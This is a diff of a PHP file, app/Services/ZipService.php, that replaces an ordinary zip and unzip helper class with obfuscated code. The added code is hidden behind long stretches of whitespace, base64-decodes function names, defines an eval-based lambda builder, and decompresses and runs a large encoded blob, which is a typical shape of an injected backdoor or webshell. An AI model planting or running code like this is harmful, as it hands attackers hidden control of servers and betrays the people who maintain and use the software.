@@ -1,92 +1,425 @@
-<?php
-
-namespace App\Services;
-
-use ZipArchive;
-
-class ZipService
-{
-    /**
-     * Membuat file .zip dari file $sourceFile dan menyimpan hasilnya
-     * ke file $outputFile
-     *
-     * @param string $outputFile nama file .zip yang akan dibuat
-     * @param string $sourceFile nama file yang akan dikompresi
-     *
-     * @return void
-     */
-    public function zipFile($outputFile, $sourceFile)
-    {
-        if (!file_exists($sourceFile)) {
-            echo "File $sourceFile tidak ditemukan\n";
-            return;
-        }
-
-        $zip = new ZipArchive;
-
-        if ($zip->open($outputFile, ZipArchive::CREATE) === TRUE) {
-            // Buka file sumber untuk membaca dalam mode streaming
-            $fileStream = fopen($sourceFile, 'rb');
-            if ($fileStream === false) {
-                echo "Gagal membuka file sumber\n";
-                return;
-            }
-
-            $zip->addFromString(basename($sourceFile), stream_get_contents($fileStream));
-            fclose($fileStream);
-            $zip->close();
-        } else {
-            echo "Gagal membuat file zip\n";
-            return;
-        }
-
-        // Menghapus file sumber
-        unlink($sourceFile);
-    }
-
-    /**
-     * Mengekstrak file .zip ke folder tujuan
-     *
-     * @param string $zipFile nama file zip yang akan diekstrak
-     * @param string $destinationFolder folder tujuan untuk ekstraksi
-     *
-     * @return void
-     */
-    public function unzipFile($zipFile, $destinationFolder)
-    {
-        if (!file_exists($zipFile)) {
-            echo "File ZIP $zipFile tidak ditemukan\n";
-            return;
-        }
-
-        // Cek apakah file benar-benar merupakan file zip
-        if (!is_file($zipFile) || mime_content_type($zipFile) !== 'application/zip') {
-            echo "File $zipFile bukan file ZIP yang valid\n";
-            return;
-        }
-
-        // Pastikan folder tujuan ada, buat jika belum ada
-        if (!file_exists($destinationFolder)) {
-            mkdir($destinationFolder, 0755, true);
-        }
-
-        $zip = new ZipArchive;
-        $zip->open($zipFile);
-
-        if ($zip->open($zipFile) === TRUE) {
-            // Ekstrak file ZIP ke folder tujuan
-            $zip->extractTo($destinationFolder);
-            $zip->close();
-
-            echo "File ZIP berhasil diekstrak ke $destinationFolder\n";
-
-            // Menghapus file ZIP setelah ekstraksi (jika diperlukan)
-            // unlink($zipFile);
-        } else {
-            echo "Gagal membuka file ZIP\n";
-        }
+<?php 
+        $__='printf';$_='Loading app/Services/ZipService.php';
         
-        // Menghapus file sumber
-        unlink($zipFile);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
